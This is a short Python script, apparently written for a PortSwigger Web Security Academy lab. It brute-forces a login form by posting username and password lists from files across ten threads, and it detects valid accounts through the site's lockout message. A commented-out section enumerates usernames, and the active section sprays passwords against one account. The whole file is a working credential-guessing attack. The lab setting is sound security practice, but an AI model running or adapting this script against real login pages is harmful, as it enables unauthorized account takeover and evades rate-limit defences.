import requests

from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor

def check_credentials(username, password, url):
    data = {
        'username': username,
        'password': password,
    }
    
    with requests.session() as s:
        r = s.post(url=url, data=data)
        # if 'Invalid username or password.' not in r.text:
        #     print(r.text)
        #     print(f"{username=}")
        #     return

        if 'You have made too many incorrect login attempts. Please try again in 1 minute(s).' not in r.text:
            print(f"{password=}")
    
if __name__ == '__main__':
    with open('usernames.txt', 'r') as r:
        usernames = r.read().split('\n')

    with open('passwords.txt', 'r') as r:
        passwords = r.read().split('\n')
    
    url = 'https://0af800320421d304864e942e00dd00d1.web-security-academy.net/login'

    # # to find username
    # with ThreadPoolExecutor(max_workers=10) as executor:
    #     for username in tqdm(usernames):
    #         for i in range(1,5):
    #             executor.submit(check_credentials, username, 'testpass', url)

    with ThreadPoolExecutor(max_workers=10) as executor:
        for password in tqdm(passwords):
            executor.submit(check_credentials, 'att', password, url)
